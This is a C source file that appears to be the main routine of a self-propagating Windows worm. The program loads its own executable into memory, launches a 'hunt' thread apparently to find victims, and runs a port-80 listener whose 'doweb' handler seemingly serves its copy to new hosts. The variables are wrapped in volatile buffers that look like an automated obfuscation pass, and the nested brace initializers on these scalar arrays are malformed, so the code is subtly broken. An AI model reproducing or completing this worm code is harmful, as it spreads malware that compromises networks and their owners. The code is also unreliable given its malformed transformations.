#pragma optimize("", off)

#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>

int main(int argc, char **argv, char **env) {
    WSADATA wsaData;
    SOCKADDR_IN server_addr, client_addr;

    // Transform SOCKET listen_sock
    volatile SOCKET listen_sock_buf[2] = {{0, (SOCKET)0}};
    volatile SOCKET *p_listen_sock = (volatile SOCKET *)&listen_sock_buf[0];

    // Transform SOCKET client_sock
    volatile SOCKET client_sock_buf[2] = {{0, (SOCKET)0}};
    volatile SOCKET *p_client_sock = (volatile SOCKET *)&client_sock_buf[0];

    // Transform int addr_len
    volatile int addr_len_buf[2] = {{sizeof(client_addr), (int)0}};
    volatile int *p_addr_len = (volatile int *)&addr_len_buf[0];

    // Transform HANDLE hFile
    volatile HANDLE hFile_buf[2] = {{NULL, (HANDLE)0}};
    volatile HANDLE *p_hFile = (volatile HANDLE *)&hFile_buf[0];

    // Transform DWORD bytesread
    volatile DWORD bytesread_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_bytesread = (volatile DWORD *)&bytesread_buf[0];

    // Transform DWORD threadId
    volatile DWORD threadId_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_threadId = (volatile DWORD *)&threadId_buf[0];

    if (argc < 1) return 1;

    (*p_hFile) = CreateFileA(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if ((*p_hFile) == INVALID_HANDLE_VALUE) return 1;

    _sizemybytes = GetFileSize((*p_hFile), NULL);
    if (_sizemybytes == INVALID_FILE_SIZE) { CloseHandle((*p_hFile)); return 1; }

    _mybytes = (char *)malloc(_sizemybytes);
    if (!_mybytes) { CloseHandle((*p_hFile)); return 1; }

    if (!ReadFile((*p_hFile), _mybytes, _sizemybytes, &(*p_bytesread), NULL) || (*p_bytesread) != _sizemybytes) {
        free(_mybytes);
        CloseHandle((*p_hFile));
        return 1;
    }
    CloseHandle((*p_hFile));

    if (WSAStartup(MAKEWORD(1, 1), &wsaData) != 0) {
        free(_mybytes);
        return 1;
    }

    setuphostname();

    // Start hunting thread
    CreateThread(NULL, 0, hunt, NULL, 0, &(*p_threadId));

    (*p_listen_sock) = socket(AF_INET, SOCK_STREAM, 0);
    if ((*p_listen_sock) == INVALID_SOCKET) {
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(80);

    if (bind((*p_listen_sock), (struct sockaddr *)&server_addr, sizeof(server_addr)) != 0) {
        closesocket((*p_listen_sock));
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    if (listen((*p_listen_sock), 5) != 0) {
        closesocket((*p_listen_sock));
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    while (TRUE) {
        (*p_client_sock) = accept((*p_listen_sock), (struct sockaddr *)&client_addr, &(*p_addr_len));
        if ((*p_client_sock) == INVALID_SOCKET) continue;
        CreateThread(NULL, 0, doweb, &(*p_client_sock), 0, &(*p_threadId));
    }

    // Never reached
    closesocket((*p_listen_sock));
    WSACleanup();
    free(_mybytes);
    return 0;
}

#pragma optimize("", on)
